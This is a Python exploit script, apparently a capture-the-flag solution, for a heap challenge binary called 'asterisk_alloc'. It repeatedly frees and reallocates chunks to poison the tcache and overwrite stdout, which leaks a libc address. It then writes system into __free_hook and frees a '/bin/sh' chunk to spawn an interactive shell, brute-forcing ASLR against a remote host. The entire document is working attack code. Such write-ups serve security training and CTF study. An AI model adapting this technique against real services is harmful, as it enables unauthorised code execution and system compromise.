#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './asterisk_alloc'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'target', 'port':4296})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc.so.6')
env.select()

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_stdout      = libc.symbols['_IO_2_1_stdout_']
offset_libc_free_hook       = libc.symbols['__free_hook']
offset_libc_io_stdfile_lock =  offset_libc_free_hook - 0x28

#==========

def attack(conn, **kwargs):
    aa = AsteriskAlloc(conn)

    aa.realloc(0x18, 'r')
    aa.calloc(0x410, 'c')

    aa.free('r', True)
    aa.realloc(0x28, 'r')
    aa.free('r', True)
    aa.realloc(0x18, 'r')

    aa.free('c')
    aa.free('r')
    aa.free('r')

    aa.realloc_new(0x18, '\x80')
    aa.realloc_new(0x410, p64(0x7ffff7dd0788) if env.check('debug') else p64(offset_libc_stdout + 0x28)[:2])
    aa.realloc_new(0x18, '1')
    aa.realloc_new(0x18, '/bin/sh\x00')
    aa.malloc(0x18, '\xff')

    conn.recv(5)
    addr_libc_io_stdfile_lock = u64(conn.recv(8))
    libc.address = addr_libc_io_stdfile_lock - offset_libc_io_stdfile_lock
    if libc.address & 0xfff:
        raise
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_free_hook = libc.symbols['__free_hook']
    addr_libc_system    = libc.sep_function['system']

    aa.realloc_new(0x28, 'r')
    aa.free('r')
    aa.free('r')

    aa.realloc_new(0x28, p64(addr_libc_free_hook))
    aa.realloc_new(0x28, 'a')
    aa.realloc_new(0x28, p64(addr_libc_system))
    aa.free('c')

class AsteriskAlloc:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def malloc(self, size, data):
        self.sendlineafter('choice: ', '1')
        self.sendlineafter('Size: ', str(size))
        self.sendafter('Data: ', data)

    def calloc(self, size, data):
        self.sendlineafter('choice: ', '2')
        self.sendlineafter('Size: ', str(size))
        self.sendafter('Data: ', data)

    def realloc(self, size, data = None):
        self.sendlineafter('choice: ', '3')
        self.sendlineafter('Size: ', str(size))
        if data is not None:
            self.sendafter('Data: ', data)

    def r_clear(self):
        self.realloc(-1)

    def realloc_new(self, size, data = None):
        self.r_clear()
        self.realloc(size, data)

    def free(self, which, clear = False):
        if which == 'r' and clear:
            self.realloc(0)
        else:
            self.sendlineafter('choice: ', '4')
            self.sendlineafter('Which: ', which)

#==========

if __name__=='__main__':
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.bruteforce(attack)
    comn.connection.interactive()

#==========
